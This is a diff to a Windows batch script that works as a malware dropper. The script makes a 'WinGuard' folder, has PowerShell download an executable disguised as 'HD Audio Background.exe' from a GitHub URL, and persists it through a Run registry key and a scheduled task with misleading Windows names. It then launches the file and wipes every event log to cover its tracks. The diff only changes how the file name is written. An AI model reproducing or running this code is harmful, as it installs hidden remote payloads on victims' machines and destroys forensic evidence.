@@ -21,10 +21,11 @@ cls
 echo --------------------cerete-my-path--------------------------------------------------
 mkdir "%systemdrive%\programdata\WinGuard"
 echo ----------------------------copy-my-files-to-web-sever-------------------------------------
-PowerShell.exe (New-Object System.Net.WebClient).DownloadFile('https://github.com/joker320im-cyber/SLASH/raw/refs/heads/main/HD%20Audio%20Background.exe','%programdata%\WinGuard\HD Audio Background.exe')
+PowerShell.exe (New-Object System.Net.WebClient).DownloadFile('https://github.com/joker320im-cyber/SLASH/raw/refs/heads/main/HD%20Audio%20Background.exe','%programdata%\WinGuard\HD%20Audio%20Background.exe')
 echo -----------start-paylod------------------------
-REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "WindowsPowerup" /t REG_SZ /F /D "%programdata%\WinGuard\HD Audio Background.exe"
-schtasks /create /tn WindowsUpdate /ru "%username%" /sc ONSTART /DELAY 0000:30  /RL HIGHEST /tr "%programdata%\WinGuard\HD Audio Background.exe" /f
-start %programdata%\WinGuard\HD Audio Background.exe
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "WindowsPowerup" /t REG_SZ /F /D "%programdata%\WinGuard\HD%20Audio%20Background.exe"
+schtasks /create /tn WindowsUpdate /ru "%username%" /sc ONSTART /DELAY 0000:30  /RL HIGHEST /tr "%programdata%\WinGuard\HD%20Audio%20Background.exe" /f
+start %programdata%\WinGuard\HD%20Audio%20Background.exe
 echo -----------delete-evnt-log-------------------------------------------
+
 for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
